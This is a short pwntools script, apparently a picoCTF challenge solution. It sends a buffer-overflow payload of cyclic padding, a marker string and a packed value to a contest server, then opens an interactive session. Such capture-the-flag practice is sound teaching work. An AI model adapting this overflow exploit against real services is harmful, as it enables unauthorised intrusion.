from pwn import *
payload = cyclic(0x100) + b'meowmeow' + p64(0xdeadbeef)
p = connect('mars.picoctf.net', 31890)
p.sendlineafter('see', payload)
p.interactive()
